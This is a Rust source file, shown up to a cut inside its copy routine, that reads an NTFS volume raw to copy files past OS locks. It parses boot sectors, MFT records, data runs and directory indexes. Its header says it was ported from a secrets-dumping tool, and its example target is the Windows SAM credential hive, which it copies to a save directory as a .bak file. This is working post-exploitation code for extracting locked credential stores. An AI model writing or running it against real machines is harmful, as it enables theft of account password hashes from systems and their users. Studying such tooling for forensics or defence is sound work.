/// Raw NTFS file copy — bypasses OS file locks by parsing NTFS on-disk structures directly.
/// Windows only. Requires administrator privileges (raw volume access).
/// No child processes — everything in-process via CreateFileW + ReadFile on \\.\X: volume.
///
/// Ported from AxiomSecrets (https://github.com/mallo-m/AxiomSecrets).

#[cfg(windows)]
use super::winapi_helpers::win;

#[cfg(windows)]
extern "system" {
    fn ReadFile(
        h: *mut std::ffi::c_void, buf: *mut u8, n: u32,
        read: *mut u32, overlapped: *mut std::ffi::c_void,
    ) -> i32;
    fn WriteFile(
        h: *mut std::ffi::c_void, buf: *const u8, n: u32,
        written: *mut u32, overlapped: *mut std::ffi::c_void,
    ) -> i32;
}

// ── On-disk NTFS structures (packed, matching raw layout) ──────────────────

#[cfg(windows)]
mod ntfs {
    // NTFS Boot Sector BPB
    #[repr(C, packed)]
    #[derive(Copy, Clone)]
    pub struct Bpb {
        pub jmp: [u8; 3],
        pub signature: [u8; 8],
        pub bytes_per_sector: u16,
        pub sectors_per_cluster: u8,
        pub reserved_sectors: u16,
        pub zeros1: [u8; 3],
        pub not_used1: u16,
        pub media_descriptor: u8,
        pub zeros2: u16,
        pub sectors_per_track: u16,
        pub number_of_heads: u16,
        pub hidden_sectors: u32,
        pub not_used2: u32,
        pub not_used3: u32,
        pub total_sectors: u64,
        pub lcn_mft: u64,
        pub lcn_mft_mirr: u64,
        pub clusters_per_file_record: u32,
        pub clusters_per_index_block: u32,
        pub volume_sn: [u8; 8],
        pub code: [u8; 430],
        pub _aa: u8,
        pub _55: u8,
    }

    // File Record Header
    pub const FILE_RECORD_MAGIC: u32 = 0x454C4946; // "FILE" little-endian
    pub const FILE_RECORD_FLAG_INUSE: u16 = 0x01;

    #[repr(C, packed)]
    #[derive(Copy, Clone, Debug)]
    pub struct FileRecordHeader {
        pub magic: u32,
        pub offset_of_us: u16,
        pub size_of_us: u16,
        pub lsn: u64,
        pub seq_no: u16,
        pub hardlinks: u16,
        pub offset_of_attr: u16,
        pub flags: u16,
        pub real_size: u32,
        pub alloc_size: u32,
        pub ref_to_base: u64,
        pub next_attr_id: u16,
        pub align: u16,
        pub record_no: u32,
    }

    // Attribute Header (Common)
    pub const ATTR_TYPE_STANDARD_INFORMATION: u32 = 0x10;
    pub const ATTR_TYPE_ATTRIBUTE_LIST: u32 = 0x20;
    pub const ATTR_TYPE_FILE_NAME: u32 = 0x30;
    pub const ATTR_TYPE_DATA: u32 = 0x80;
    pub const ATTR_TYPE_INDEX_ROOT: u32 = 0x90;
    pub const ATTR_TYPE_INDEX_ALLOCATION: u32 = 0xA0;
    pub const ATTR_END: u32 = 0xFFFFFFFF;

    #[repr(C, packed)]
    #[derive(Copy, Clone, Debug)]
    pub struct AttrHeaderCommon {
        pub attr_type: u32,
        pub total_size: u32,
        pub non_resident: u8,
        pub name_length: u8,
        pub name_offset: u16,
        pub flags: u16,
        pub id: u16,
    }

    #[repr(C, packed)]
    #[derive(Copy, Clone, Debug)]
    pub struct AttrHeaderResident {
        pub common: AttrHeaderCommon,
        pub attr_size: u32,
        pub attr_offset: u16,
        pub indexed_flag: u8,
        pub padding: u8,
    }

    #[repr(C, packed)]
    #[derive(Copy, Clone, Debug)]
    pub struct AttrHeaderNonResident {
        pub common: AttrHeaderCommon,
        pub start_vcn: u64,
        pub last_vcn: u64,
        pub data_run_offset: u16,
        pub comp_unit_size: u16,
        pub padding: u32,
        pub alloc_size: u64,
        pub real_size: u64,
        pub ini_size: u64,
    }

    // File Name attribute body
    pub const ATTR_FILENAME_NAMESPACE_DOS: u8 = 0x02;

    #[repr(C, packed)]
    #[derive(Copy, Clone)]
    pub struct AttrFileName {
        pub parent_ref: u64,
        pub create_time: u64,
        pub alter_time: u64,
        pub mft_time: u64,
        pub read_time: u64,
        pub alloc_size: u64,
        pub real_size: u64,
        pub flags: u32,
        pub er: u32,
        pub name_length: u8,
        pub name_space: u8,
        // followed by name_length u16 characters
    }

    // Index Root attribute body
    #[repr(C, packed)]
    #[derive(Copy, Clone, Debug)]
    pub struct AttrIndexRoot {
        pub attr_type: u32,
        pub coll_rule: u32,
        pub ib_size: u32,
        pub clusters_per_ib: u8,
        pub padding1: [u8; 3],
        pub entry_offset: u32,
        pub total_entry_size: u32,
        pub alloc_entry_size: u32,
        pub flags: u8,
        pub padding2: [u8; 3],
    }

    // Index Entry
    pub const INDEX_ENTRY_FLAG_SUBNODE: u8 = 0x01;
    pub const INDEX_ENTRY_FLAG_LAST: u8 = 0x02;

    #[repr(C, packed)]
    #[derive(Copy, Clone, Debug)]
    pub struct IndexEntry {
        pub file_reference: u64,
        pub size: u16,
        pub stream_size: u16,
        pub flags: u8,
        pub padding: [u8; 3],
        // followed by stream data (ATTR_FILE_NAME if stream_size > 0)
        // if SUBNODE flag set: last 8 bytes before end = VCN of sub-node
    }

    // Index Block header
    pub const INDEX_BLOCK_MAGIC: u32 = 0x58444E49; // "INDX" little-endian

    #[repr(C, packed)]
    #[derive(Copy, Clone, Debug)]
    pub struct IndexBlockHeader {
        pub magic: u32,
        pub offset_of_us: u16,
        pub size_of_us: u16,
        pub lsn: u64,
        pub vcn: u64,
        pub entry_offset: u32,
        pub total_entry_size: u32,
        pub alloc_entry_size: u32,
        pub not_leaf: u8,
        pub padding: [u8; 3],
    }

    // MFT well-known indices
    pub const MFT_IDX_MFT: u64 = 0;
    pub const MFT_IDX_ROOT: u64 = 5;
    pub const MFT_IDX_USER: u64 = 16;
}

// ── DataRun entry ──────────────────────────────────────────────────────────

#[cfg(windows)]
#[derive(Clone, Debug)]
struct DataRunEntry {
    lcn: i64,       // -1 = sparse
    clusters: u64,
    start_vcn: u64,
    last_vcn: u64,
}

// ── NTFS Volume handle ────────────────────────────────────────────────────

#[cfg(windows)]
struct NtfsVolume {
    handle: *mut std::ffi::c_void,
    sector_size: u32,
    cluster_size: u32,
    file_record_size: u32,
    index_block_size: u32,
    mft_addr: u64,
    mft_data_runs: Vec<DataRunEntry>,  // $MFT DATA attribute runs (for fragmented MFT)
}

#[cfg(windows)]
impl Drop for NtfsVolume {
    fn drop(&mut self) {
        if !self.handle.is_null() {
            unsafe { windows_sys::Win32::Foundation::CloseHandle(self.handle); }
        }
    }
}

#[cfg(windows)]
impl NtfsVolume {
    /// Open a raw NTFS volume by drive letter (e.g. 'C').
    fn open(letter: char) -> anyhow::Result<Self> {
        use windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE;
        use windows_sys::Win32::Storage::FileSystem::{
            CreateFileW, OPEN_EXISTING, FILE_SHARE_READ, FILE_SHARE_WRITE,
            FILE_ATTRIBUTE_READONLY,
        };
        use windows_sys::Win32::Foundation::GENERIC_READ;

        // Build \\.\X: path
        let path: Vec<u16> = format!("\\\\.\\{}:", letter)
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let handle = unsafe {
            CreateFileW(
                path.as_ptr(),
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                std::ptr::null(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_READONLY,
                std::ptr::null_mut(),
            )
        };
        if handle == INVALID_HANDLE_VALUE {
            return Err(win::last_error("CreateFileW (volume)"));
        }

        // Read the first 512 bytes (boot sector)
        let mut bpb_buf = [0u8; 512];
        let mut bytes_read: u32 = 0;
        let ok = unsafe {
            ReadFile(
                handle,
                bpb_buf.as_mut_ptr(),
                512,
                &mut bytes_read,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 || bytes_read != 512 {
            unsafe { windows_sys::Win32::Foundation::CloseHandle(handle); }
            anyhow::bail!("Failed to read boot sector");
        }

        // Verify NTFS signature
        if &bpb_buf[3..11] != b"NTFS    " {
            unsafe { windows_sys::Win32::Foundation::CloseHandle(handle); }
            anyhow::bail!("Not an NTFS volume");
        }

        // Parse BPB fields (manually to avoid packed struct alignment issues)
        let bytes_per_sector = u16::from_le_bytes([bpb_buf[11], bpb_buf[12]]) as u32;
        let sectors_per_cluster = bpb_buf[13] as u32;
        let cluster_size = bytes_per_sector * sectors_per_cluster;

        // ClustersPerFileRecord at offset 64 (4 bytes)
        let cpfr = bpb_buf[64] as i8;
        let file_record_size = if cpfr > 0 {
            cluster_size * cpfr as u32
        } else {
            1u32 << (-(cpfr) as u32)
        };

        // ClustersPerIndexBlock at offset 68 (4 bytes)
        let cpib = bpb_buf[68] as i8;
        let index_block_size = if cpib > 0 {
            cluster_size * cpib as u32
        } else {
            1u32 << (-(cpib) as u32)
        };

        // LCN of MFT at offset 48 (8 bytes)
        let lcn_mft = u64::from_le_bytes(bpb_buf[48..56].try_into().unwrap());
        let mft_addr = lcn_mft * cluster_size as u64;

        let mut vol = NtfsVolume {
            handle,
            sector_size: bytes_per_sector,
            cluster_size,
            file_record_size,
            index_block_size,
            mft_addr,
            mft_data_runs: Vec::new(),
        };

        // Read $MFT file record (index 0) to get its DATA attribute runs
        // This handles fragmented MFT
        let mft_fr = vol.read_file_record_raw(ntfs::MFT_IDX_MFT)?;
        vol.mft_data_runs = parse_data_runs_from_record(&mft_fr, vol.file_record_size)?;

        Ok(vol)
    }

    /// Read raw bytes from the volume at an absolute byte offset.
    fn read_at(&self, offset: u64, buf: &mut [u8]) -> anyhow::Result<()> {
        use windows_sys::Win32::Storage::FileSystem::{SetFilePointer, FILE_BEGIN};

        let low = (offset & 0xFFFFFFFF) as u32;
        let mut high = (offset >> 32) as i32;

        let result = unsafe {
            SetFilePointer(self.handle, low as i32, &mut high, FILE_BEGIN)
        };
        if result == u32::MAX {
            let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
            if err != 0 {
                return Err(win::last_error("SetFilePointer"));
            }
        }

        let mut bytes_read: u32 = 0;
        let ok = unsafe {
            ReadFile(
                self.handle,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut bytes_read,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 || bytes_read as usize != buf.len() {
            anyhow::bail!("ReadFile failed: expected {} bytes, got {}", buf.len(), bytes_read);
        }
        Ok(())
    }

    /// Read a file record by MFT index (raw, no MFT data run lookup for indices < 16).
    fn read_file_record_raw(&self, index: u64) -> anyhow::Result<Vec<u8>> {
        let offset = self.mft_addr + (self.file_record_size as u64) * index;
        let mut buf = vec![0u8; self.file_record_size as usize];
        self.read_at(offset, &mut buf)?;
        Ok(buf)
    }

    /// Read a file record by MFT index (handles fragmented MFT via data runs).
    fn read_file_record(&self, index: u64) -> anyhow::Result<Vec<u8>> {
        if index < ntfs::MFT_IDX_USER || self.mft_data_runs.is_empty() {
            // For system records or if we don't have MFT data runs yet, direct read
            return self.read_file_record_raw(index);
        }

        // Read through MFT data runs (fragmented MFT support)
        let fr_offset = (self.file_record_size as u64) * index;
        let mut buf = vec![0u8; self.file_record_size as usize];
        self.read_data_runs(&self.mft_data_runs, fr_offset, &mut buf)?;
        Ok(buf)
    }

    /// Read data at a byte offset from a set of data runs.
    fn read_data_runs(&self, runs: &[DataRunEntry], offset: u64, buf: &mut [u8]) -> anyhow::Result<usize> {
        let cs = self.cluster_size as u64;
        let mut remaining = buf.len();
        let mut buf_pos = 0usize;
        let mut cur_offset = offset;

        for run in runs {
            let run_start_byte = run.start_vcn * cs;
            let run_end_byte = (run.last_vcn + 1) * cs;

            if cur_offset >= run_end_byte {
                continue; // haven't reached this run yet
            }
            if cur_offset < run_start_byte {
                break; // past all relevant runs
            }

            let offset_in_run = cur_offset - run_start_byte;

            if run.lcn == -1 {
                // Sparse: fill with zeros
                let avail = (run_end_byte - cur_offset) as usize;
                let to_read = remaining.min(avail);
                buf[buf_pos..buf_pos + to_read].fill(0);
                buf_pos += to_read;
                cur_offset += to_read as u64;
                remaining -= to_read;
            } else {
                let disk_offset = (run.lcn as u64) * cs + offset_in_run;
                let avail = (run_end_byte - cur_offset) as usize;
                let to_read = remaining.min(avail);
                self.read_at(disk_offset, &mut buf[buf_pos..buf_pos + to_read])?;
                buf_pos += to_read;
                cur_offset += to_read as u64;
                remaining -= to_read;
            }

            if remaining == 0 {
                break;
            }
        }

        Ok(buf_pos)
    }

    /// Read clusters from data runs.
    fn read_clusters_from_runs(&self, runs: &[DataRunEntry], vcn: u64, count: u32, buf: &mut [u8]) -> anyhow::Result<usize> {
        let cs = self.cluster_size as u64;
        let offset = vcn * cs;
        let len = (count as u64 * cs) as usize;
        let actual = len.min(buf.len());
        self.read_data_runs(runs, offset, &mut buf[..actual])
    }
}

// ── Parse data runs from raw bytes ────────────────────────────────────────

#[cfg(windows)]
fn decode_data_runs(data: &[u8]) -> Vec<DataRunEntry> {
    let mut runs = Vec::new();
    let mut pos = 0;
    let mut lcn: i64 = 0;
    let mut vcn: u64 = 0;

    while pos < data.len() {
        let header = data[pos];
        if header == 0 {
            break;
        }
        pos += 1;

        let length_bytes = (header & 0x0F) as usize;
        let offset_bytes = (header >> 4) as usize;

        if length_bytes == 0 || length_bytes > 8 || offset_bytes > 8 {
            break;
        }
        if pos + length_bytes + offset_bytes > data.len() {
            break;
        }

        // Read length (cluster count)
        let mut length_val: u64 = 0;
        for i in 0..length_bytes {
            length_val |= (data[pos + i] as u64) << (i * 8);
        }
        pos += length_bytes;

        // Read offset (signed, relative to previous LCN)
        let mut offset_val: i64 = 0;
        if offset_bytes > 0 {
            for i in 0..offset_bytes {
                offset_val |= (data[pos + i] as i64) << (i * 8);
            }
            // Sign extend
            if data[pos + offset_bytes - 1] & 0x80 != 0 {
                for i in offset_bytes..8 {
                    offset_val |= 0xFFi64 << (i * 8);
                }
            }
            pos += offset_bytes;
            lcn += offset_val;
        }

        let entry = DataRunEntry {
            lcn: if offset_bytes == 0 { -1 } else { lcn },
            clusters: length_val,
            start_vcn: vcn,
            last_vcn: vcn + length_val - 1,
        };
        vcn += length_val;
        runs.push(entry);
    }

    runs
}

/// Parse DATA attribute data runs from a raw file record buffer.
#[cfg(windows)]
fn parse_data_runs_from_record(record: &[u8], file_record_size: u32) -> anyhow::Result<Vec<DataRunEntry>> {
    let fr_size = file_record_size as usize;
    if record.len() < std::mem::size_of::<ntfs::FileRecordHeader>() {
        anyhow::bail!("File record too small");
    }

    let magic = u32::from_le_bytes(record[0..4].try_into().unwrap());
    if magic != ntfs::FILE_RECORD_MAGIC {
        anyhow::bail!("Invalid file record magic: 0x{:08X}", magic);
    }

    // Patch update sequence
    let mut patched = record.to_vec();
    patch_update_sequence(&mut patched, fr_size)?;

    // Walk attributes to find DATA (0x80)
    let attr_offset = u16::from_le_bytes(patched[20..22].try_into().unwrap()) as usize;
    let mut pos = attr_offset;

    while pos + 16 <= patched.len() {
        let attr_type = u32::from_le_bytes(patched[pos..pos + 4].try_into().unwrap());
        if attr_type == ntfs::ATTR_END {
            break;
        }
        let attr_total_size = u32::from_le_bytes(patched[pos + 4..pos + 8].try_into().unwrap()) as usize;
        if attr_total_size == 0 {
            break;
        }

        if attr_type == ntfs::ATTR_TYPE_DATA {
            let non_resident = patched[pos + 8];
            if non_resident == 1 {
                // Non-resident DATA attribute
                let data_run_offset = u16::from_le_bytes(patched[pos + 32..pos + 34].try_into().unwrap()) as usize;
                let run_start = pos + data_run_offset;
                let run_end = pos + attr_total_size;
                if run_start < run_end && run_end <= patched.len() {
                    return Ok(decode_data_runs(&patched[run_start..run_end]));
                }
            }
            // Resident DATA: no data runs needed (data is inline)
            return Ok(Vec::new());
        }

        pos += attr_total_size;
        if pos >= fr_size {
            break;
        }
    }

    anyhow::bail!("DATA attribute not found in file record")
}

/// Patch the Update Sequence in a file record or index block buffer.
#[cfg(windows)]
fn patch_update_sequence(buf: &mut [u8], _sector_size_hint: usize) -> anyhow::Result<()> {
    if buf.len() < 8 {
        anyhow::bail!("Buffer too small for US patch");
    }

    let us_offset = u16::from_le_bytes(buf[4..6].try_into().unwrap()) as usize;
    let us_size = u16::from_le_bytes(buf[6..8].try_into().unwrap()) as usize; // in words (USN + array)

    if us_size < 2 || us_offset + us_size * 2 > buf.len() {
        return Ok(()); // No US to patch or invalid
    }

    let usn = u16::from_le_bytes(buf[us_offset..us_offset + 2].try_into().unwrap());
    let sectors = us_size - 1;

    // Determine sector size: for file records use volume sector size (512 typically)
    // The sector count from US tells us: sectors = record_size / sector_size
    let sector_size = if sectors > 0 { buf.len() / sectors } else { 512 };

    for i in 0..sectors {
        let sector_end = (i + 1) * sector_size;
        if sector_end < 2 || sector_end > buf.len() {
            break;
        }
        let check_pos = sector_end - 2;
        let stored = u16::from_le_bytes(buf[check_pos..check_pos + 2].try_into().unwrap());
        if stored != usn {
            anyhow::bail!("Update Sequence Number mismatch at sector {}: expected 0x{:04X}, got 0x{:04X}", i, usn, stored);
        }
        // Replace with actual data from US array
        let array_pos = us_offset + 2 + i * 2;
        if array_pos + 2 <= buf.len() {
            buf[check_pos] = buf[array_pos];
            buf[check_pos + 1] = buf[array_pos + 1];
        }
    }

    Ok(())
}

// ── Attribute parsing helpers ─────────────────────────────────────────────

#[cfg(windows)]
struct ParsedRecord {
    data: Vec<u8>,  // US-patched raw bytes
    file_record_size: u32,
}

#[cfg(windows)]
impl ParsedRecord {
    fn parse(vol: &NtfsVolume, mft_index: u64) -> anyhow::Result<Self> {
        let raw = vol.read_file_record(mft_index)?;
        let mut data = raw;

        let magic = u32::from_le_bytes(data[0..4].try_into().unwrap());
        if magic != ntfs::FILE_RECORD_MAGIC {
            anyhow::bail!("Invalid file record magic for MFT index {}", mft_index);
        }

        patch_update_sequence(&mut data, vol.file_record_size as usize)?;

        Ok(ParsedRecord {
            data,
            file_record_size: vol.file_record_size,
        })
    }

    fn flags(&self) -> u16 {
        u16::from_le_bytes(self.data[22..24].try_into().unwrap())
    }

    fn is_in_use(&self) -> bool {
        self.flags() & ntfs::FILE_RECORD_FLAG_INUSE != 0
    }

    /// Iterate over attributes in this file record.
    fn attrs(&self) -> AttrIter<'_> {
        let offset = u16::from_le_bytes(self.data[20..22].try_into().unwrap()) as usize;
        AttrIter { data: &self.data, pos: offset, limit: self.file_record_size as usize }
    }

    /// Find DATA attribute and return its data runs (non-resident) or inline data (resident).
    fn data_attr(&self) -> Option<DataAttrInfo> {
        for attr in self.attrs() {
            if attr.attr_type == ntfs::ATTR_TYPE_DATA && attr.name_length == 0 {
                if attr.non_resident {
                    let data_run_offset = u16::from_le_bytes(
                        self.data[attr.offset + 32..attr.offset + 34].try_into().unwrap()
                    ) as usize;
                    let real_size = u64::from_le_bytes(
                        self.data[attr.offset + 48..attr.offset + 56].try_into().unwrap()
                    );
                    let run_start = attr.offset + data_run_offset;
                    let run_end = attr.offset + attr.total_size;
                    let runs = decode_data_runs(&self.data[run_start..run_end]);
                    return Some(DataAttrInfo::NonResident { runs, real_size });
                } else {
                    let attr_size = u32::from_le_bytes(
                        self.data[attr.offset + 16..attr.offset + 20].try_into().unwrap()
                    ) as usize;
                    let attr_body_offset = u16::from_le_bytes(
                        self.data[attr.offset + 20..attr.offset + 22].try_into().unwrap()
                    ) as usize;
                    let start = attr.offset + attr_body_offset;
                    let end = start + attr_size;
                    if end <= self.data.len() {
                        return Some(DataAttrInfo::Resident(self.data[start..end].to_vec()));
                    }
                }
            }
        }
        None
    }

    /// Find INDEX_ROOT attribute for directory traversal.
    fn index_root(&self) -> Option<IndexRootInfo> {
        for attr in self.attrs() {
            if attr.attr_type == ntfs::ATTR_TYPE_INDEX_ROOT {
                let body_offset = u16::from_le_bytes(
                    self.data[attr.offset + 20..attr.offset + 22].try_into().unwrap()
                ) as usize;
                let body_start = attr.offset + body_offset;
                if body_start + 32 > self.data.len() {
                    continue;
                }
                let index_attr_type = u32::from_le_bytes(
                    self.data[body_start..body_start + 4].try_into().unwrap()
                );
                if index_attr_type != ntfs::ATTR_TYPE_FILE_NAME {
                    continue; // Not a filename index
                }
                let entry_offset = u32::from_le_bytes(
                    self.data[body_start + 16..body_start + 20].try_into().unwrap()
                ) as usize;
                let total_entry_size = u32::from_le_bytes(
                    self.data[body_start + 20..body_start + 24].try_into().unwrap()
                ) as usize;
                let entries_start = body_start + 16 + entry_offset;
                let entries_end = (body_start + 16 + total_entry_size).min(self.data.len());
                return Some(IndexRootInfo {
                    entries_data: self.data[entries_start..entries_end].to_vec(),
                });
            }
        }
        None
    }

    /// Find INDEX_ALLOCATION attribute data runs (for large directories).
    fn index_alloc_runs(&self) -> Option<Vec<DataRunEntry>> {
        for attr in self.attrs() {
            if attr.attr_type == ntfs::ATTR_TYPE_INDEX_ALLOCATION && attr.non_resident {
                let data_run_offset = u16::from_le_bytes(
                    self.data[attr.offset + 32..attr.offset + 34].try_into().unwrap()
                ) as usize;
                let run_start = attr.offset + data_run_offset;
                let run_end = attr.offset + attr.total_size;
                if run_start < run_end && run_end <= self.data.len() {
                    return Some(decode_data_runs(&self.data[run_start..run_end]));
                }
            }
        }
        None
    }
}

#[cfg(windows)]
struct AttrRef {
    offset: usize,
    attr_type: u32,
    total_size: usize,
    non_resident: bool,
    name_length: u8,
}

#[cfg(windows)]
struct AttrIter<'a> {
    data: &'a [u8],
    pos: usize,
    limit: usize,
}

#[cfg(windows)]
impl<'a> Iterator for AttrIter<'a> {
    type Item = AttrRef;

    fn next(&mut self) -> Option<AttrRef> {
        if self.pos + 16 > self.data.len() || self.pos >= self.limit {
            return None;
        }
        let attr_type = u32::from_le_bytes(self.data[self.pos..self.pos + 4].try_into().ok()?);
        if attr_type == ntfs::ATTR_END || attr_type == 0 {
            return None;
        }
        let total_size = u32::from_le_bytes(self.data[self.pos + 4..self.pos + 8].try_into().ok()?) as usize;
        if total_size == 0 || self.pos + total_size > self.data.len() {
            return None;
        }
        let non_resident = self.data[self.pos + 8] != 0;
        let name_length = self.data[self.pos + 9];
        let r = AttrRef {
            offset: self.pos,
            attr_type,
            total_size,
            non_resident,
            name_length,
        };
        self.pos += total_size;
        Some(r)
    }
}

#[cfg(windows)]
enum DataAttrInfo {
    Resident(Vec<u8>),
    NonResident { runs: Vec<DataRunEntry>, real_size: u64 },
}

#[cfg(windows)]
struct IndexRootInfo {
    entries_data: Vec<u8>,
}

// ── Index entry parsing and B+ tree traversal ─────────────────────────────

/// Extract filename from an index entry's stream (ATTR_FILE_NAME struct).
#[cfg(windows)]
fn index_entry_filename(entry_data: &[u8], entry_offset: usize) -> Option<String> {
    let stream_size = u16::from_le_bytes(
        entry_data[entry_offset + 10..entry_offset + 12].try_into().ok()?
    ) as usize;
    if stream_size == 0 {
        return None;
    }
    let stream_start = entry_offset + 16; // after the 16-byte INDEX_ENTRY header
    // AttrFileName: name_length at offset 64, name_space at offset 65, name starts at offset 66
    if stream_start + 66 > entry_data.len() {
        return None;
    }
    let name_length = entry_data[stream_start + 64] as usize;
    let _name_space = entry_data[stream_start + 65];
    let name_start = stream_start + 66;
    let name_end = name_start + name_length * 2;
    if name_end > entry_data.len() {
        return None;
    }
    let name_u16: Vec<u16> = (0..name_length)
        .map(|i| u16::from_le_bytes([entry_data[name_start + i * 2], entry_data[name_start + i * 2 + 1]]))
        .collect();
    Some(String::from_utf16_lossy(&name_u16))
}

/// Get sub-node VCN from an index entry (last 8 bytes of the entry).
#[cfg(windows)]
fn index_entry_subnode_vcn(entry_data: &[u8], entry_offset: usize) -> Option<u64> {
    let flags = entry_data[entry_offset + 12];
    if flags & ntfs::INDEX_ENTRY_FLAG_SUBNODE == 0 {
        return None;
    }
    let entry_size = u16::from_le_bytes(
        entry_data[entry_offset + 8..entry_offset + 10].try_into().ok()?
    ) as usize;
    if entry_size < 8 {
        return None;
    }
    let vcn_pos = entry_offset + entry_size - 8;
    if vcn_pos + 8 > entry_data.len() {
        return None;
    }
    Some(u64::from_le_bytes(entry_data[vcn_pos..vcn_pos + 8].try_into().ok()?))
}

/// Search for a filename in index entries data. Returns (MFT reference, found).
#[cfg(windows)]
fn search_index_entries(
    vol: &NtfsVolume,
    entries_data: &[u8],
    target: &str,
    alloc_runs: &Option<Vec<DataRunEntry>>,
) -> anyhow::Result<Option<u64>> {
    let target_upper: Vec<u16> = target.encode_utf16().map(|c| {
        if c < 128 { (c as u8 as char).to_uppercase().next().unwrap() as u16 } else { c }
    }).collect();

    let mut pos = 0;
    while pos + 16 <= entries_data.len() {
        let entry_size = u16::from_le_bytes(
            entries_data[pos + 8..pos + 10].try_into().unwrap_or([0, 0])
        ) as usize;
        if entry_size == 0 || pos + entry_size > entries_data.len() {
            break;
        }
        let flags = entries_data[pos + 12];

        if let Some(name) = index_entry_filename(entries_data, pos) {
            let name_upper: Vec<u16> = name.encode_utf16().map(|c| {
                if c < 128 { (c as u8 as char).to_uppercase().next().unwrap() as u16 } else { c }
            }).collect();

            if name_upper == target_upper {
                // Found it
                let file_ref = u64::from_le_bytes(
                    entries_data[pos..pos + 8].try_into().unwrap()
                ) & 0x0000_FFFF_FFFF_FFFF;
                return Ok(Some(file_ref));
            }

            // Case-insensitive comparison for B+ tree ordering
            let cmp = name_upper.cmp(&target_upper);
            if cmp == std::cmp::Ordering::Greater {
                // target is smaller; check sub-node
                if let Some(vcn) = index_entry_subnode_vcn(entries_data, pos) {
                    if let Some(ref runs) = alloc_runs {
                        if let Some(found) = search_index_block(vol, runs, vcn, target)? {
                            return Ok(Some(found));
                        }
                    }
                }
                // Not found in sub-node, and we've passed where it should be
                // Continue to check rest of entries (NTFS B+ tree isn't strictly binary)
            }
        } else if flags & ntfs::INDEX_ENTRY_FLAG_LAST != 0 {
            // Last entry, no name — check sub-node
            if let Some(vcn) = index_entry_subnode_vcn(entries_data, pos) {
                if let Some(ref runs) = alloc_runs {
                    if let Some(found) = search_index_block(vol, runs, vcn, target)? {
                        return Ok(Some(found));
                    }
                }
            }
            break;
        }

        if flags & ntfs::INDEX_ENTRY_FLAG_LAST != 0 {
            break;
        }

        pos += entry_size;
    }

    Ok(None)
}

/// Search for a filename in an index block (INDEX_ALLOCATION).
#[cfg(windows)]
fn search_index_block(
    vol: &NtfsVolume,
    alloc_runs: &[DataRunEntry],
    vcn: u64,
    target: &str,
) -> anyhow::Result<Option<u64>> {
    let ib_size = vol.index_block_size as usize;
    let mut buf = vec![0u8; ib_size];
    let byte_offset = vcn * vol.cluster_size as u64;
    vol.read_data_runs(alloc_runs, byte_offset, &mut buf)?;

    // Verify magic
    let magic = u32::from_le_bytes(buf[0..4].try_into().unwrap());
    if magic != ntfs::INDEX_BLOCK_MAGIC {
        return Ok(None);
    }

    // Patch update sequence
    patch_update_sequence(&mut buf, ib_size)?;

    // Parse index entries (offset at byte 24, relative to byte 24)
    let entry_offset = u32::from_le_bytes(buf[24..28].try_into().unwrap()) as usize;
    let total_entry_size = u32::from_le_bytes(buf[28..32].try_into().unwrap()) as usize;
    let entries_start = 24 + entry_offset;
    let entries_end = (24 + total_entry_size).min(buf.len());

    if entries_start >= entries_end {
        return Ok(None);
    }

    let entries_data = &buf[entries_start..entries_end];
    let alloc_runs_opt = Some(alloc_runs.to_vec());
    search_index_entries(vol, entries_data, target, &alloc_runs_opt)
}

/// Navigate a path on an NTFS volume and return the MFT index of the target file.
/// Path components are separated by backslash (e.g. "Windows\System32\config\SAM").
#[cfg(windows)]
fn resolve_path(vol: &NtfsVolume, path_components: &[&str]) -> anyhow::Result<u64> {
    let mut current_mft = ntfs::MFT_IDX_ROOT; // Start at root directory (MFT index 5)

    for (i, component) in path_components.iter().enumerate() {
        let record = ParsedRecord::parse(vol, current_mft)?;
        let index_root = record.index_root()
            .ok_or_else(|| anyhow::anyhow!("MFT record {} is not a directory", current_mft))?;
        let alloc_runs = record.index_alloc_runs();

        let found = search_index_entries(vol, &index_root.entries_data, component, &alloc_runs)?;
        match found {
            Some(mft_ref) => {
                current_mft = mft_ref;
            }
            None => {
                let path_so_far: String = path_components[..=i].join("\\");
                anyhow::bail!("Path component '{}' not found (path: {})", component, path_so_far);
            }
        }
    }

    Ok(current_mft)
}

/// Read all data from a file's DATA attribute.
#[cfg(windows)]
fn read_file_data(vol: &NtfsVolume, mft_index: u64) -> anyhow::Result<Vec<u8>> {
    let record = ParsedRecord::parse(vol, mft_index)?;
    let data_attr = record.data_attr()
        .ok_or_else(|| anyhow::anyhow!("No DATA attribute found for MFT index {}", mft_index))?;

    match data_attr {
        DataAttrInfo::Resident(data) => Ok(data),
        DataAttrInfo::NonResident { runs, real_size } => {
            if real_size > 256 * 1024 * 1024 {
                anyhow::bail!("File too large ({} bytes) — limit 256 MB", real_size);
            }
            let mut buf = vec![0u8; real_size as usize];
            let read = vol.read_data_runs(&runs, 0, &mut buf)?;
            buf.truncate(read);
            Ok(buf)
        }
    }
}

/// Copy a file from NTFS to a save directory.
#[cfg(windows)]
fn copy_file_to_dir(vol: &NtfsVolume, mft_index: u64, filename: &str, save_dir: &str) -> anyhow::Result<String> {
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_WRITE,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
    };
    use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, CloseHandle};

    let record = ParsedRecord::parse(vol, mft_index)?;
    let data_attr = record.data_attr()
        .ok_or_else(|| anyhow::anyhow!("No DATA attribute for '{}'", filename))?;

    let dest = format!("{}\\{}.bak", save_dir, filename);
    let dest_w: Vec<u16> = dest.encode_utf16().chain(std::iter::once(0)).collect();

    let h = unsafe {
        CreateFileW(
            dest_w.as_ptr(),
            FILE_GENERIC_READ | FILE_GENERIC_WRITE,
            FILE_SHARE_WRITE,
            std::ptr::null(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            std::ptr::null_mut(),
        )
    };
    if h == INVALID_HANDLE_VALUE {
        return Err(win::last_error(&format!("CreateFileW({})", dest)));
    }

    let result = (|| -> anyhow::Result<u64> {
        match data_attr {
            DataAttrInfo::Resident(data) => {
                let mut written: u32 = 0;
